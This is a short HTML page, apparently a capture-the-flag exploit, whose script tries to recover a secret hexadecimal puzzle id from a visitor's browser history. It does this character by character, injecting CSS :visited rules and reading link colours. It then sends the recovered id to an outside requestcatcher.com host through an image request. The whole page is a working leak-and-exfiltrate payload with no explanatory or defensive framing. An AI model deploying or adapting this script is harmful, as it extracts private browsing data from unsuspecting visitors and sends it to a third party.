<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CTF Leak JS</title>
  <style id="dynamic-style">
    .checklink { color: black; }
  </style>
</head>
<body>
  <a id="test" class="checklink" style="display:none"></a>
  <script>
    (async () => {
      const base = 'http://34.146.134.179:3000/puzzle?id=';
      const catcher = 'https://singetu0096.requestcatcher.com';
      const hex = '0123456789abcdef';
      let id = '';
      const a = document.getElementById('test');
      const style = document.getElementById('dynamic-style');

      for (let pos = 0; pos < 32; pos++) {
        style.textContent = '.checklink { color: black; }\n';
        for (const c of hex) {
          style.textContent += `a.checklink[href^=\"${base}${id}${c}\"]:visited { color: red !important; }\n`;
        }

        let found = false;
        for (const c of hex) {
          a.href = base + id + c;
          document.body.appendChild(a);
          await new Promise(requestAnimationFrame);
          if (getComputedStyle(a).color === 'rgb(255, 0, 0)') {
            id += c;
            found = true;
            break;
          }
          document.body.removeChild(a);
        }

        if (!found) break;
      }

      new Image().src = `${catcher}?fullid=${id}`;
    })();
  </script>
</body>
</html>
